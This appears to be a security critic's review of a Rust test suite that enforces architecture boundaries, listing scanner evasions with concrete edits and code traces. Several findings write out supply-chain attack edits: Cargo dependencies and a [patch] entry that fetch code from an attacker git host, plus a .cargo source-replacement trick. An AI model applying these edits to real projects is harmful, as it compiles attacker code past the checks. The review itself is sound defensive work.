# Critic 4 — concrete-evasion review of the architecture-boundary suite

Artifact under review: `crates/gauntlet-arch-tests` (walk, escapes, text, denylist,
literals, deps, envfile) plus the four evidence locators under `tests/contract/`.
Frozen standard: AK-001, AK-002, AK-016, AK-019 (`.wayfinder/answer-key.md:1-18,
107-136`), spec §4.1, §8.1, §24.3. Reviewed read-only, from source, blind to build
history. Every finding below carries a concrete edit and a trace through the
scanner code showing why nothing fires.

VERDICT: residuals-found (1 critical / 5 major / 3 minor)

---

## C1 (critical) — the external-dependency channel is completely unpoliced: an attacker-chosen crate compiles into `gauntlet-domain` with all five locators green

**Files:** `crates/gauntlet-arch-tests/src/deps.rs:212-247` (`declared_deps`),
`deps.rs:81-98` (`allowed_internal`), `deps.rs:166-194`
(`check_workspace_dependency_paths`), `crates/gauntlet-arch-tests/src/denylist.rs:82-143`
(`DENIED_TERMS`), `crates/gauntlet-arch-tests/src/lib.rs:418-432`.

AK-001 says the domain has "zero compile-time dependencies on ports, adapters, or
infrastructure", and §24.3's first bullet says the domain "declares zero
dependencies on port, adapter, or infrastructure crates". The instrument enforces
only the **internal** (workspace-member) upper bound — `declared_deps` classifies a
dependency only when it is a member name, a `path = "…"` that resolves to a member,
a `package = "…"` rename of a member, or a `workspace = true` alias that resolves
to a member. A dependency with **no `path`** — a registry version dependency or a
git dependency — never enters any of those branches and is invisible to
`check_dependency_direction`. The denylist catches such a dep only if its name
contains an enumerated vendor term; the literal scan never reads the root manifest
and only catches `scheme://` URLs. Nothing counts external deps; nothing reads
`Cargo.lock`.

**Evasion (a), registry, two lines.** Edit `crates/gauntlet-domain/Cargo.toml`:

```toml
[dependencies]
shadow-net = "0.8"
```

`shadow-net` is any attacker-published crates.io crate (MIT, no advisories). Trace:

1. `deps::declared_deps` (deps.rs:212-247): `spec` is the string `"0.8"`,
   `spec.as_table()` is `None`, so the rename/path/workspace block is skipped
   entirely; `dep` stays `"shadow-net"`; `members.iter().any(|m| m.name == dep)`
   (deps.rs:239) is false → neither internal nor unresolved. The Domain layer
   check sees nothing.
2. `denylist::scan_manifest` (denylist.rs:350-416): candidates =
   `[("dependency key", "shadow-net")]`; no `DENIED_TERMS` (denylist.rs:82-143)
   and no derived adapter identifier is a substring of `shadow-net`.
3. `denylist::scan_source` over the manifest text: same result.
4. `literals::scan_literals` over the manifest (it is in literal scope,
   walk.rs:211): `shadow-net = "0.8"` fires no class — no `/`-rooted literal, no
   drive root, no `://`, no model family, no endpoint, no well-known port, no
   multi-token literal, no tool identity, no tier vocabulary.
5. `escapes::scan_cargo_target_paths`: no target sections, no `build` key.

Result: attacker-chosen code compiles into `gauntlet-domain`; every locator
(`architecture_boundaries`, `::denylist`, `adapter_registry`,
`no_hardcoded_literals`, `env_example_complete`) is green. The evasion also
survives the repo's full `just ci`: `cargo-deny`'s `[sources] unknown-registry =
"deny"` (deny.toml) refuses only *unknown registries* — crates.io is the known
default — and licenses/advisories pass for a clean MIT crate. A proc-macro
dependency is the strongest form: it executes attacker code at build time and can
inject arbitrary tokens into the domain.

**Evasion (b), scp-syntax git dep, member manifest.** Edit
`crates/gauntlet-domain/Cargo.toml`:

```toml
[dependencies]
infra = { git = "git@github.com:attacker/gauntlet-infra" }
```

`declared_deps`: the spec table has no `package`/`path`/`workspace` → invisible.
Denylist: `"infra"` carries no term. Literals: the scp form has no `://`, so
`find_url_scheme` (literals.rs:517-537) — the only incidental catch — never fires
(an `https://` git URL in a *member* manifest would fire `hardcoded-url`; the scp
form does not). All green; arbitrary git code compiles into the domain.

**Evasion (c), workspace-inherited git dep, the V4 channel reopened one door
over.** Edit the root `Cargo.toml`:

```toml
[workspace.dependencies]
infra = { git = "git@github.com:attacker/gauntlet-infra" }
```

and `crates/gauntlet-domain/Cargo.toml`:

```toml
[dependencies]
infra.workspace = true
```

Trace: `workspace_dep_names` maps alias `infra → infra` (no `package` field,
deps.rs:143-161); `declared_deps` resolves `dep = "infra"` → not a member →
invisible. `check_workspace_dependency_paths` (deps.rs:166-194) only inspects
entries that have a `path` key — `continue` otherwise — so the git entry is
skipped. `denylist::scan_manifest`'s workspace-inheritance resolution (round-3
V4's fix) checks the *resolved name* for denied terms — `"infra"` has none. The
root-table text scan (`workspace_dependencies_text`, denylist.rs:429-445) runs the
denylist — not the literal scanner — over that line, and `"infra"` matches no
term. The root manifest is in no literal scope, so the URL (even `https://` here)
is never literal-scanned. All green.

**Why this is critical:** the rubric's critical is "compiles attacker-chosen
code/dependency into a core crate with all locators green", and all three variants
do exactly that, with two-line edits, through the manifest channel the suite
exists to police. Round-3 V4 closed the *renamed-vendor-name* case; the class
behind it — any non-path dependency that is not a workspace member — is open.

**Fix direction:** a member's dependency sections (already enumerated by
`dependency_sections`, including target-scoped, dev, and build tables) should
admit only (i) known members and (ii) a declared, tiny allowlist of external
crates (`toml`, and nothing else today — the workspace currently has zero
external deps in core crates). Anything else — version spec, git, registry — is
undeclared infrastructure by AK-001's own words and should be a violation, not of
a denylist of names, but of the channel. `check_workspace_dependency_paths`
should likewise treat a root `[workspace.dependencies]` entry without `path` as
requiring the same allowlist.

---

## M1 (major) — a line split *before* the `=` defeats the timeout and tier-policy classes

**Files:** `crates/gauntlet-arch-tests/src/text.rs:124-129`
(`opens_continuation`), `text.rs:140-166` (`statement_lines`),
`crates/gauntlet-arch-tests/src/literals.rs:894-928` (`find_timeout`,
`find_tier_policy`).

Round-3 V17 fixed the rustfmt shape `CONST … =\n    value;` by joining a line
that *ends* on `=`, `(`, `,`, `[`, `+` up to the `;`. The join never starts when
the split is placed **before** the `=`. rustc accepts both.

**Evasion.** Edit `crates/gauntlet-app/src/lib.rs`:

```rust
pub const STALL_TIMEOUT_MS: u64
    = 900_000;
pub static REVIEW_MODE: &str
    = "adversarial";
```

Trace: physical lines are the only units (no string continuation, no fragment
join). `statement_lines` (text.rs:140-166): line 1 ends in `4` — not an open
continuation token (text.rs:124-129) — so no join starts; line 2 contains `;` so
it is skipped as a join *source*. The two never share a unit. In
`scan_literals`: unit 1 (`pub const STALL_TIMEOUT_MS: u64`) has the
`contains_hint` hit but no numeric literal (`u64`'s digits are preceded by word
bytes, literals.rs:614); unit 2 (`= 900_000;`) has the number with introducer `=`
but no hint — `find_timeout` (literals.rs:894-904) requires both from the *same*
unit. For the tier line, `find_tier_policy` (literals.rs:907-928) requires
`const `/`static `/`default` on the same unit as the literal; unit 2 has neither.
`900_000` is not a well-known port. Denylist: no terms. All locators green; a
900-second stall policy and an `adversarial` review mode are hardcoded in the
application layer. (Model-id, tool-identity, command, and path classes survive
this split because they are literal-anchored, not identifier-coupled.)

**Fix direction:** `statement_lines` should also join when a line *ends* on `:`
+ type-ish tail and the *next* line begins with `=` — or more robustly, join any
declaration line lacking `;` with the following lines up to `;` when the first
joined line contains `const`/`static`/`let`.

## M2 (major) — single-token command literals and define-then-`Command::new(var)` defeat the command clause

**Files:** `crates/gauntlet-arch-tests/src/literals.rs:135-193`
(`COMMAND_HEADS`), `literals.rs:198-231` (`TOOL_IDENTITIES`),
`literals.rs:853-882` (`find_command`).

`COMMAND_HEADS` and `TOOL_IDENTITIES` are different lists. A command head that is
not a tool identity — `bash`, `sh`, `zsh`, `node`, `python`, `make`, `just`,
`rustc`, `go`, `java`, `deno`, `bun`, `cmake`, `mvn`, `pip`, `grep`, `sed`, `awk`,
`tar`, `scp`, `pwsh`, `powershell`, `ruff` — passes as a whole string literal.

**Evasion.** Edit `crates/gauntlet-app/src/lib.rs`:

```rust
pub const SHELL: &str = "bash";
pub fn shell() -> Command { std::process::Command::new(SHELL) }
```

Trace: `"bash"` is one token, and `find_command`'s multi-token loop requires
`tokens.len() >= 2` (literals.rs:861-864); `find_tool_identity` checks
`TOOL_IDENTITIES`, which does not contain `bash`. The `Command::new(` branch
(literals.rs:854-859) fires only when a string literal is on the *same unit* as
the call — `Command::new(SHELL)` has none, which is correct for config-driven
values but also launders the const. §8.1/AK-016 name "command" as a class; the
compiled behavior is a hardcoded `bash` invocation. (Note `"git"` or `"cargo"`
alone would be caught as tool identities — the gap is exactly the set difference
of the two lists, which is large and includes the two most common shells.)

**Fix direction:** make `TOOL_IDENTITIES ⊇ COMMAND_HEADS` (every executable head
is a tool product), or flag any single-token string literal equal to a
`COMMAND_HEADS` entry on a `const`/`static` line.

## M3 (major) — AK-016's "provider" class has no matcher and is not a disclosed residual

**Files:** `crates/gauntlet-arch-tests/src/literals.rs:1-69` (class table and
residuals), `crates/gauntlet-arch-tests/src/lib.rs:31-33` (instrument summary),
`denylist.rs:82-143`.

AK-016 and §8.1 enumerate: "No path, model, **provider**, command, port number,
timeout, tier policy, or tool identity is a hardcoded literal". The literal
scanner has classes for every one of these except *provider*; the instrument's
own summary (lib.rs:31-33) silently drops it, and the residuals section
(literals.rs:20-61), which carefully discloses model-id/tier/tool/timeout/command
gaps, does not mention provider. The only incidental coverage is the denylist's
enumerated vendor names.

**Evasion.** Edit `crates/gauntlet-app/src/lib.rs`:

```rust
pub const PROVIDER: &str = "deepinfra";
```

Trace: `"deepinfra"` contains no `DENIED_TERMS` substring (it stops one byte
short of `deepseek`); it matches no model family (`find_model_id` needs
`family-<alnum>` or `family<digit>`; `deepinfra` has no digit and does not start
with any listed family); it is not an endpoint, URL, path, port, command, tool
identity, or tier term. A model-provider identity is compiled into the
application layer with every locator green.

**Fix direction:** either add a provider-name class (the denylist vocabulary is
the natural term set, applied to whole literals) or record the class as an
explicit residual in literals.rs — today it is neither enforced nor disclosed.

## M4 (major) — the "no path" clause is enforced as "no absolute path": relative path literals pass

**Files:** `crates/gauntlet-arch-tests/src/literals.rs:446-491`
(`find_absolute_path`, `find_absolute_path_literal`), literals.rs:1032-1037
(test pinning the posture).

**Evasion.** Edit `crates/gauntlet-domain/src/lib.rs`:

```rust
pub const STATE_DB: &str = "state/gauntlet.db";
```

Trace: the `/` is preceded by `e`, a path-context byte, so `find_absolute_path`
skips it (literals.rs:452-454); the literal does not start with `/`, so
`find_absolute_path_literal` ignores it (literals.rs:486-491); no drive root; no
other class applies. AK-016's text says "No **path** … is a hardcoded literal";
`"state/gauntlet.db"` is a path, compiled into the domain, all locators green.
The posture is visible in the class table and pinned by
`relative_unix_paths_are_not_flagged`, so it is a deliberate narrowing — but it
is a narrowing of a named clause of the frozen Unit, and unlike the model/tier
residuals it is not argued against the Unit text anywhere. `~`-rooted and
multi-segment relative paths (`"~/.gauntlet/state"`, `"run/state.db"`) pass the
same way.

**Fix direction:** either document this as a residual with the reason a relative
literal is not environment coupling, or flag string literals containing a `/.…`-
shaped or `.db`/`.sock`/`.toml`-suffixed relative path outside the defaults
module.

## M5 (major) — Cargo substitution channels beyond `[patch]`-with-`path` are unpoliced: the instrument's own `toml` crate can be swapped for attacker code

**Files:** `crates/gauntlet-arch-tests/src/deps.rs:423-459`
(`check_patch_and_replace`), `crates/gauntlet-arch-tests/src/walk.rs:20-25`
(`CORE_CRATES`), `crates/gauntlet-arch-tests/src/lib.rs:307-351`.

Round-3 V9 policed `[patch]`/`[replace]` entries carrying `path = "…"`. Two
channels remain open:

1. **`[patch]` with a git source.** Edit the root `Cargo.toml`:
   ```toml
   [patch.crates-io]
   toml = { git = "https://github.com/attacker/toml-fork" }
   ```
   `check_patch_and_replace`'s closure returns immediately when the spec has no
   `path` key (deps.rs:427-431); the root manifest is in no literal scope; the
   denylist root-table scan extracts only `[workspace.dependencies]` lines
   (denylist.rs:429-445). All green — and the crate substituted is `toml`, the
   single dependency of `gauntlet-arch-tests`, i.e. the parser behind every
   manifest check this suite performs. A doctored `toml` can make
   `text.parse::<Table>()` mis-report member manifests, silently defeating
   AK-001/AK-002 from inside a green run. (Today no *core* crate has an external
   dep to patch, which is why this is major rather than critical; combined with
   C1 it becomes core-crate code injection.)
2. **`.cargo/config.toml` source replacement.** No code in the repository reads
   `.cargo/` at all (the walk covers `crates/` core crates, the root manifest,
   and the spec). `[source.crates-io] replace-with = "vendored-sources"` +
   `[source.vendored-sources] directory = "vendor"` redirects every registry
   dependency to a local `vendor/` tree outside every walk — invisible, and it
   composes with C1(a). `[build] rustflags` in the same file is a further
   repo-resident injection point (`--extern`, `--cfg`) that no gate sees.

**Fix direction:** treat the root manifest's `[patch]`/`[replace]` tables as
violating unless *empty or fully path-resolved to members* regardless of source
kind; and add `.cargo/config.toml` (and the existence of a `vendor/` directory)
to the scope-integrity check — a core-crate build with local source replacement
is exactly "the compiler compiles a file nothing scans".

---

## m1 (minor) — credential-shape enumeration misses JWTs and un-prefixed tokens in `.env.example` comments

**File:** `crates/gauntlet-arch-tests/src/envfile.rs:48-63` (`CREDENTIAL_SHAPES`),
`envfile.rs:94-107` (`raw_credentials`).

`raw_credentials` (round-3 V10) scans raw comment lines, but only for the
enumerated shapes. A committed live JWT — `# GAUNTLET_API_TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJ...`
— matches none of `sk-`/`ghp_`/`akia`/… and passes; so does any bare hex or
base64 token with no known prefix. Values on live entries must be empty, so only
the comment channel is affected. Concrete edit: append that comment line to
`.env.example`; `check_env_example` returns no violation. Minor because the
attack requires committing a non-standard-shaped secret; fix by adding `eyJ`
and requiring comment lines to match `^\s*#\s*[A-Z0-9_]+=` with an empty value.

## m2 (minor) — runtime-assembled strings defeat the denylist and the adapter-segment rule

**Files:** `crates/gauntlet-arch-tests/src/denylist.rs:295-337` (`scan_source`),
`literals.rs:808-836` (`string_literals`).

All text matching is over literals present in the source. Edit
`crates/gauntlet-app/src/lib.rs`:

```rust
pub fn backend() -> String { ["mo", "ck"].join("") }
```

No unit contains `mock` as a whole literal (`segment_literal` compares extracted
string literals for equality, denylist.rs:270-277); no substring term appears;
`String::from("rusq") + "lite"` behaves the same for vendor terms. AK-002/AK-014
are evaded by deliberate runtime assembly. This is an inherent limit of a text
scanner (only a real parser with dataflow could close it), but it is not
disclosed in the artifact's residual lists, which read as if normalization
closes the splitting family. Recording it is the fix.

## m3 (minor, low confidence) — whitespace-split directive spellings may evade the escape matcher

**File:** `crates/gauntlet-arch-tests/src/escapes.rs:162-183`
(`directive_arguments`), `escapes.rs:322-334` (`find_ascii_ci`).

The attribute matcher searches for the contiguous bytes `#[` and the include
matcher for contiguous `include!`. Rust tokenizes `#` `[` and `path` `!` `(` as
separate tokens, so `# [path = "../../../vendor/store.rs"] mod store;` and
`include ! ("../../../vendor/store.rs");` are plausibly accepted by rustc while
matching nothing here. I could not compile to confirm rustc's acceptance (this
review is non-compiling by constraint), so this is filed as low-confidence: if
either spelling compiles, the escape scanner misses it. A one-line hardening —
allow whitespace between `#` and `[`, and between the directive name and `!` —
removes the question.

---

## Probed and found CLOSED (with evidence)

- **`#[path]`/`include!`/`include_str!`/`include_bytes!` escapes, all rustc
  spellings** — `#[cfg_attr(all(), path=…)]`, `#[ path = …]`, `#[PATH = …]`,
  attribute bodies found structurally: escapes.rs:162-232; raw-string arguments:
  escapes.rs:262-299.
- **Escaped path segments in `#[path]`/`include!`** (`"\x2e\x2e/vendor/x.rs"`) —
  caught because `scan_escapes` iterates `text::scan_units`, which includes the
  escape-decoded form of every unit: escapes.rs:99, text.rs:245-268,
  text.rs:172-240.
- **Unresolvable include/attribute arguments** (`concat!`, `env!("OUT_DIR")`,
  identifiers) are violations, never "inside": escapes.rs:126-137, 249-258.
- **`build.rs`** by file presence and by `[package].build` key, with `build =
  false` honored: escapes.rs:385-409.
- **Cargo target relocation** `[lib]`/`[[bin]]`/`[[test]]`/`[[bench]]`/`[[example]]`
  `path` leaving the crate or absolute: escapes.rs:339-395; exemption pinned to
  exactly `crates/gauntlet-arch-tests` and asserted to never include a core
  crate: escapes.rs:74-80, 678-690.
- **Symlinks inside core crates** (files and directories) are violations, never
  followed: walk.rs:129-140.
- **Oversized / non-UTF-8 / unreadable files** are violations, not skips:
  walk.rs:165-192, 69.
- **Workspace-inherited renames to denied vendor names** (V4): denylist.rs:376-384;
  root `[workspace.dependencies]` text-scanned with true line numbers:
  lib.rs:344-349, denylist.rs:429-445.
- **`[patch]`/`[replace]` carrying `path`** outside the member set: deps.rs:423-459
  (the git variant is M5).
- **Path dependencies to non-member directories**, including target-scoped,
  dev-, and build-dependency tables: deps.rs:118-139, 212-247, 272-281.
- **Undeclared package directories under `crates/**`**: deps.rs:363-377, 464-477;
  glob-member trickery fails loudly in `read_members`: deps.rs:312-340.
- **Adapter-identifier scope carve-outs** guarded by the anti-vacuity assertion,
  both directions: lib.rs:232-294, 391-413.
- **Composition-root mask is a mask, not a skip**, and space-replacement cannot
  splice a term from two halves: denylist.rs:252-260 (tests at 647-699).
- **Defaults-module exemption** cannot go vacuous; the denylist applies to it
  either way: lib.rs:438-475, walk.rs:203-213.
- **Line continuations, `concat!` fragments** (including raw strings and
  interleaved block comments), `\x`/`\u{}` escapes, and rustfmt splits *after*
  `=`: text.rs:61-114, 140-166, 172-240, 283-361.
- **Comment-laundered credentials in `.env.example`**: envfile.rs:94-107.
- **Lockstep deletion of env variables** — floor derived from spec-wide
  `GAUNTLET_` tokens: envfile.rs:117-128, 235-269.
- **Inline-module `#[path]` depth** — the resolver's shallower base errs in the
  safe direction (scanner-inside implies rustc-inside), by analysis of
  normalize_join composition.

## Residuals judged disclosed rather than defective

- Model-id family enumeration (literals.rs:28-31).
- Tier policy restricted to `const`/`static`/`default` lines (literals.rs:32-38).
- Tool-identity parser-collision risk (literals.rs:39-41).
- Timeout hint enumeration and word boundary (literals.rs:43-50).
- Command stopword posture (literals.rs:51-56).
- Absolute paths in comments rooted outside `ABSOLUTE_PATH_ROOTS`
  (literals.rs:57-61).
- Well-known-ports-only posture for the port class (literals.rs:86-95) — note it
  shares the Unit-letter tension of M4 but is explicitly tabulated.
- Capability segments (`agent`, `state`, `observe`, …) deliberately not derived
  as adapter identifiers: denylist.rs:204-213, 813-820.

## Summary

The suite's "what gets scanned must equal what compiles" rule is enforced
vigorously at the *source* level (escapes, symlinks, normalization, vacuity
guards are all genuinely hard), but not at the *Cargo* level: C1 shows the
entire non-`path` dependency channel — registry, git, and workspace-inherited —
compiling attacker-chosen code into `gauntlet-domain` with every locator green,
and M5 shows the substitution channels (`[patch]`-with-git, `.cargo/config.toml`)
that can reach even the instrument's own `toml` dependency. M1-M4 are single-edit
defeats of named AK-016 clauses (timeout+tier via a pre-`=` split; command via
single-token heads; provider via a class that does not exist; path via
absolute-only matching).
